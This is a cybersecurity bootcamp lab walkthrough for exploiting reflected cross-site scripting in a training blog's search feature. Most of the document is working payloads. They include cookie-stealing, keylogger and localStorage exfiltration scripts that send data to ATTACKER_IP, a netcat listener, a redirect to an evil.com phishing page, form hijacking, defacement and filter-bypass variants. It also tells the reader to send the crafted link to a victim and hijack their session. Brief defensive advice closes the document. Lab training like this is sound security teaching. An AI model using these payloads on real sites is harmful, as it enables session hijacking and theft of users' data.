# XSS Lab Walkthrough

> **Lab URL:** http://10.10.61.221/search/
> **Search Endpoint:** http://10.10.61.221/search/search?q=
> **Business Name:** ByteWise Developer Blog
> **Last Verified:** March 2026

---

## Overview

**XSS (Cross-Site Scripting)** is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. This can lead to session hijacking, defacement, or malware distribution.

In this lab, you'll exploit a **Reflected XSS** vulnerability in a search feature that doesn't sanitize user input.

---

## Types of XSS

| Type | Description | Persistence |
|------|-------------|-------------|
| **Reflected** | Payload in URL, reflected in response | Non-persistent |
| **Stored** | Payload saved in database, shown to all users | Persistent |
| **DOM-based** | Payload executed via client-side JavaScript | Client-side |

This lab focuses on **Reflected XSS**.

---

## Lab Architecture

```
┌──────────────┐     ┌─────────────────┐     ┌──────────────────┐
│   Attacker   │────►│ ByteWise Blog   │────►│     Victim       │
│  Crafts URL  │     │ /search/search  │     │  Clicks Link     │
└──────────────┘     │  (loc_xss_lab)  │     └──────────────────┘
                     │    Port 3000    │              │
                     └─────────────────┘              ▼
                                              ┌──────────────────┐
                                              │  Script Executes │
                                              │  in Victim's     │
                                              │  Browser!        │
                                              └──────────────────┘
```

---

## Step 1: Explore the Search Feature

1. Go to http://10.10.61.221/search/
2. You'll see "ByteWise Developer Blog" with a search box in the navbar
3. Try a normal search: `javascript`
4. Notice the search term appears in:
   - The URL: `/search/search?q=javascript`
   - The page: "Showing results for: javascript"
   - The search box value

---

## Step 2: Test for XSS

Try entering special characters to see if they're encoded:

```
<script>alert(1)</script>
```

**In this lab:** The `<script>` and `</script>` tags are **filtered out** (removed)!

So `<script>alert(1)</script>` becomes just `alert(1)` - no execution.

**But other tags work!** Try:
```html
<img src=x onerror=alert(1)>
```

This bypasses the filter because it doesn't use script tags.

---

## Step 3: Basic XSS Payloads

### Alert Box (Proof of Concept)

```html
<script>alert('XSS')</script>
```

URL:
```
http://10.10.61.221/search/search?q=<script>alert('XSS')</script>
```

### Alert with Domain

```html
<script>alert(document.domain)</script>
```

### Alert with Cookies

```html
<script>alert(document.cookie)</script>
```

---

## Step 4: Alternative Payloads (If `<script>` is Filtered)

### Image Tag with onerror

```html
<img src=x onerror=alert('XSS')>
```

URL:
```
http://10.10.61.221/search/search?q=<img src=x onerror=alert('XSS')>
```

### SVG Tag

```html
<svg onload=alert('XSS')>
```

### Body Tag

```html
<body onload=alert('XSS')>
```

### Input Tag

```html
<input onfocus=alert('XSS') autofocus>
```

### Marquee Tag

```html
<marquee onstart=alert('XSS')>
```

### Details Tag

```html
<details open ontoggle=alert('XSS')>
```

---

## Step 5: Cookie Stealing Attack

### Step 5.1: Set Up Attacker Server

On your machine, start a simple HTTP server to receive stolen cookies:

```bash
# Python 3
python3 -m http.server 8888

# Or netcat
nc -lvnp 8888
```

### Step 5.2: Craft the Payload

```html
<img src=x onerror="fetch('http://ATTACKER_IP:8888/?c='+document.cookie)">
```

Or using Image object:

```html
<script>new Image().src='http://ATTACKER_IP:8888/?c='+document.cookie</script>
```

### Step 5.3: Create Malicious URL

```
http://10.10.61.221/search/search?q=<img src=x onerror="fetch('http://ATTACKER_IP:8888/?c='+document.cookie)">
```

URL encode it:
```
http://10.10.61.221/search/search?q=%3Cimg%20src%3Dx%20onerror%3D%22fetch(%27http%3A%2F%2FATTACKER_IP%3A8888%2F%3Fc%3D%27%2Bdocument.cookie)%22%3E
```

### Step 5.4: Send to Victim

Send the URL to a victim (via email, chat, etc.). When they click it:
1. The page loads with the malicious script
2. Script executes in victim's browser
3. Victim's cookies are sent to your server
4. You can use the cookies to hijack their session!

---

## Step 6: Advanced Payloads

### Keylogger

```html
<script>
document.onkeypress=function(e){
    fetch('http://ATTACKER_IP:8888/?k='+e.key)
}
</script>
```

### Page Defacement

```html
<script>document.body.innerHTML='<h1>HACKED BY XSS</h1>'</script>
```

### Redirect to Phishing Page

```html
<script>window.location='http://evil.com/phishing.html'</script>
```

### Form Hijacking

```html
<script>
document.forms[0].action='http://ATTACKER_IP:8888/steal';
</script>
```

### Session Storage/Local Storage Theft

```html
<script>
fetch('http://ATTACKER_IP:8888/?s='+JSON.stringify(localStorage))
</script>
```

---

## Step 7: Bypassing Filters

### If `<script>` is blocked:

```html
<ScRiPt>alert('XSS')</ScRiPt>
<scr<script>ipt>alert('XSS')</scr</script>ipt>
```

### If `alert` is blocked:

```html
<script>confirm('XSS')</script>
<script>prompt('XSS')</script>
<script>eval('ale'+'rt(1)')</script>
```

### If quotes are blocked:

```html
<script>alert(String.fromCharCode(88,83,83))</script>
<script>alert(/XSS/.source)</script>
<script>alert(`XSS`)</script>
```

### If parentheses are blocked:

```html
<script>alert`XSS`</script>
<script>onerror=alert;throw 'XSS'</script>
```

### HTML Entity Encoding:

```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
```

### URL Encoding:

```
%3Cscript%3Ealert('XSS')%3C/script%3E
```

---

## Step 8: DOM-based XSS (Bonus)

Check if JavaScript uses URL parameters unsafely:

```javascript
// Vulnerable code example
document.write(location.search);
innerHTML = location.hash;
eval(location.search.split('=')[1]);
```

Test payload in URL fragment:
```
http://10.10.61.221/search/#<img src=x onerror=alert(1)>
```

---

## Why This Works

1. **No input sanitization** - User input is reflected directly in HTML
2. **No output encoding** - Special characters (<, >, ", ') are not escaped
3. **No Content Security Policy** - Browser allows inline scripts
4. **Same-Origin Policy bypass** - Script runs in context of vulnerable site

---

## XSS Attack Flow

```
1. Attacker crafts malicious URL with XSS payload
         ↓
2. Attacker sends URL to victim (phishing, social engineering)
         ↓
3. Victim clicks the link
         ↓
4. Server reflects payload in response (unescaped)
         ↓
5. Victim's browser executes the script
         ↓
6. Script steals cookies/data and sends to attacker
         ↓
7. Attacker uses stolen session to impersonate victim
```

---

## Defenses (What Should Be Implemented)

| Defense | Description |
|---------|-------------|
| Output Encoding | Escape <, >, ", ', & before rendering |
| Content Security Policy | HTTP header to restrict script sources |
| HTTPOnly Cookies | Prevent JavaScript access to session cookies |
| Input Validation | Reject or sanitize dangerous characters |
| Use Frameworks | React, Angular auto-escape by default |
| X-XSS-Protection | Browser built-in XSS filter (deprecated) |

### Proper Encoding Example:

```javascript
// Bad - vulnerable
element.innerHTML = userInput;

// Good - safe
element.textContent = userInput;
```

```php
// Bad - vulnerable
echo $_GET['q'];

// Good - safe
echo htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');
```

---

## Quick Verification Commands

```bash
# Test search homepage
curl -s 'http://10.10.61.221/search/'

# Test search endpoint with query
curl -s 'http://10.10.61.221/search/search?q=test' | grep "Showing results"

# Test XSS (check if img tag is reflected unescaped)
curl -s 'http://10.10.61.221/search/search?q=<img%20src=x%20onerror=alert(1)>' | grep "<img src=x"

# Note: <script> tags are filtered, but <img> works!
```

---

## Payload Cheat Sheet

| Payload | Use Case |
|---------|----------|
| `<script>alert(1)</script>` | Basic PoC |
| `<img src=x onerror=alert(1)>` | Script tag filtered |
| `<svg onload=alert(1)>` | Alternative event handler |
| `<body onload=alert(1)>` | Body tag injection |
| `javascript:alert(1)` | In href attributes |
| `'-alert(1)-'` | Inside JavaScript strings |
| `</script><script>alert(1)</script>` | Breaking out of script |

---

## Troubleshooting

**Alert not showing?**
- Check browser console for errors
- Try different payloads (img, svg)
- Check if CSP is blocking inline scripts
- Try URL encoding the payload

**Script tags removed?**
- Use alternative tags (img, svg, body)
- Try case variations (ScRiPt)
- Try nested tags

**Quotes being escaped?**
- Use backticks: `` alert`1` ``
- Use String.fromCharCode()
- Use HTML entities

---

## Summary

| Step | Action |
|------|--------|
| 1 | Find /search/ with search parameter |
| 2 | Test `<script>alert(1)</script>` |
| 3 | If blocked, try `<img src=x onerror=alert(1)>` |
| 4 | Craft cookie-stealing payload |
| 5 | URL encode and send to victim |
| 6 | Capture cookies on attacker server |
| 7 | Hijack victim's session |

**Key Takeaway:** Always encode user output! Use `htmlspecialchars()` in PHP, `textContent` in JavaScript, or framework auto-escaping.

---

## Working Payloads for This Lab

**Note:** `<script>` tags are filtered! Use alternative event handlers.

```html
<!-- These WORK on /search/search?q= -->

<img src=x onerror=alert(1)>

<img src=x onerror=alert(document.cookie)>

<svg onload=alert('XSS')>

<img src=x onerror="document.body.innerHTML='<h1>HACKED</h1>'">

<img src=x onerror="fetch('http://ATTACKER:8888/?c='+document.cookie)">

<!-- This does NOT work (filtered) -->
<script>alert(1)</script>
```

**Best payload for this lab (open in browser):**
```
http://10.10.61.221/search/search?q=<img src=x onerror=alert(document.domain)>
```

**URL-encoded version:**
```
http://10.10.61.221/search/search?q=%3Cimg%20src=x%20onerror=alert(document.domain)%3E
```

---

*LeaguesOfCode Cybersecurity Bootcamp 2026*
